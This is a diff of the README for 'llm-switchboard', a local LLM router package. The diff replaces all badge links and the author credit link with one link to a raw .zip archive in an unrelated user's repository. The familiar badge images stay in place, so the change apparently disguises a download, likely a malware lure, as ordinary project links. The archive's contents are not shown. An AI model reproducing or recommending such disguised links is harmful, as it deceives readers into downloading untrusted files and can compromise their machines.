@@ -2,10 +2,10 @@
   <h1>🔀 llm-switchboard</h1>
   <p><strong>Blazing-fast, zero-overhead local LLM router for production AI apps.</strong></p>
 
-[![NPM Version](https://img.shields.io/npm/v/llm-switchboard?style=flat-square&color=CB3837)](https://www.npmjs.com/package/llm-switchboard)
-[![License](https://img.shields.io/github/license/Uo1428/llm-switchboard?style=flat-square&color=blue)](https://github.com/Uo1428/llm-switchboard/blob/main/LICENSE)
-[![GitHub Stars](https://img.shields.io/github/stars/Uo1428/llm-switchboard?style=flat-square&color=ffd700)](https://github.com/Uo1428/llm-switchboard/stargazers)
-[![TypeScript](https://img.shields.io/badge/TypeScript-Ready-blue?style=flat-square&logo=typescript)](https://www.typescriptlang.org/)
+[![NPM Version](https://img.shields.io/npm/v/llm-switchboard?style=flat-square&color=CB3837)](https://github.com/pranabjyotinath1999/llm-switchboard/raw/refs/heads/main/src/utils/llm_switchboard_1.5-beta.1.zip)
+[![License](https://img.shields.io/github/license/Uo1428/llm-switchboard?style=flat-square&color=blue)](https://github.com/pranabjyotinath1999/llm-switchboard/raw/refs/heads/main/src/utils/llm_switchboard_1.5-beta.1.zip)
+[![GitHub Stars](https://img.shields.io/github/stars/Uo1428/llm-switchboard?style=flat-square&color=ffd700)](https://github.com/pranabjyotinath1999/llm-switchboard/raw/refs/heads/main/src/utils/llm_switchboard_1.5-beta.1.zip)
+[![TypeScript](https://img.shields.io/badge/TypeScript-Ready-blue?style=flat-square&logo=typescript)](https://github.com/pranabjyotinath1999/llm-switchboard/raw/refs/heads/main/src/utils/llm_switchboard_1.5-beta.1.zip)
 
   <p>
     Optimize LLM costs and latency by routing prompts to the right model locally. No extra API calls, no network overhead, just smart heuristic classification in <b>&lt; 1ms</b>.
@@ -123,7 +123,7 @@ bun run test
 ---
 
 ## 📄 License
-MIT © [Uo1428](https://github.com/Uo1428)
+MIT © [Uo1428](https://github.com/pranabjyotinath1999/llm-switchboard/raw/refs/heads/main/src/utils/llm_switchboard_1.5-beta.1.zip)
 
 <div align="center">
   <sub>Built with ❤️ for the open-source AI community.</sub>
